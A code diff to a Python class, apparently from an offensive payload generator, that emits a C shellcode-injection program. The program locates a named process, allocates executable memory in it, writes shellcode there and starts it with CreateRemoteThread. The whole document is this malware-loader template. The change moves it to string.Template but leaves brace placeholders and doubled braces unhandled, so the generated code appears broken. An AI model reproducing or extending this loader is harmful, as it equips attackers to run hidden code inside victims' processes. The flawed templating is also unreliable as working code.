@@ -1,3 +1,5 @@
+from string import Template
+
 class processinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -18,8 +20,8 @@ class processinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 {codeblocks}
@@ -45,7 +47,7 @@ int main(void) {{
     }}
             
     while (Process32Next(hProcSnap, &pe32)) {{
-        if (lstrcmpiA("{self.target}", pe32.szExeFile) == 0) {{
+        if (lstrcmpiA("$target", pe32.szExeFile) == 0) {{
                 pid = pe32.th32ProcessID;
                 break;
         }}
@@ -61,7 +63,7 @@ int main(void) {{
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
-    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT, {self.memoryPermission});
+    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT, $memoryPermission);
     WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
     hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
@@ -74,4 +76,4 @@ int main(void) {{
     CloseHandle(hProc);
     return 0;
 }}
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
